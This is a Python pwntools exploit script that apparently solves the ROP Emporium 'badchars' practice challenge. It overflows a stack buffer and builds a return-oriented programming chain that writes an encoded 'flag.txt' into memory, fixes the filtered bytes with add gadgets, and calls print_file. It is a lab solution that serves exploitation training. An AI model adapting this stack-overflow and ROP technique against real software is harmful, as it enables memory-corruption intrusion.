#!/usr/bin/env python3
#

import sys
from pwn import *
from threading import Thread


libc = elf = None


gs = '''
continue
'''
def start():
    if args.DEBUG:
        context.log_level = 'debug'

    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


def send(data):
    io.send(data)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target binary> [GDB] [NOASLR] [DEBUG]")
        exit(1)

    elf = context.binary = ELF(sys.argv[1])

    io = start()
    io.recvuntil(b"> ")
    io.timeout = 0.1

    # badchars are: 'x', 'g', 'a', '.'
    # badbytes 7867612e
    # 0x601000           0x602000 rw-p     1000   1000 /home/adrian/RopEmperium/badchars/badchars
    rw_mem = 0x0000000000601230

    #  mov qword ptr [r13], r12; ret;
    mov_r13_r12_gadget = p64(0x0000000000400634)
    # pop r12; pop r13; pop r14; pop r15; ret;
    pop_rs_gadget = p64(0x000000000040069c)
    # pop rdi; ret;
    pop_rdi_gadget = p64(0x00000000004006a3)
    # ret
    ret_gadget = p64(0x00000000004004ee)
    # pop r14; pop r15
    pop_r14_r15_gadget = p64(0x00000000004006a0)
    # add byte ptr [r15], r14b; ret;
    add_r15_gadget = p64(0x000000000040062c)

    garbage = b"A"*40

    rop = b""

    rop += pop_rs_gadget
    rop += b"fl``-t`t" # initial string without bad bytes -> r12
    rop += p64(rw_mem) # target mem -> r13
    rop += p64(0) # -> r14
    rop += p64(0) # -> r15
    rop += mov_r13_r12_gadget

    # we need to patch these stupid letters
    rop += pop_r14_r15_gadget
    rop += p64(1) # add 1 to get 'a'
    rop += p64(rw_mem + 2) # offset to 2nd char
    rop += add_r15_gadget

    rop += pop_r14_r15_gadget
    rop += p64(7) # get 'g'
    rop += p64(rw_mem + 3) # offset to 3rd char
    rop += add_r15_gadget

    rop += pop_r14_r15_gadget
    rop += p64(1) # add 1 to get '.'
    rop += p64(rw_mem + 4) # offset to 2nd char
    rop += add_r15_gadget

    rop += pop_r14_r15_gadget
    rop += p64(24) # get 'x'
    rop += p64(rw_mem + 6) # offset to 3rd char
    rop += add_r15_gadget

    rop += pop_rdi_gadget
    rop += p64(rw_mem)

    rop += ret_gadget # stack alignment
    rop += p64(elf.plt['print_file'])

    payload = garbage + rop
    send(payload)

    ### shell
    io.interactive()
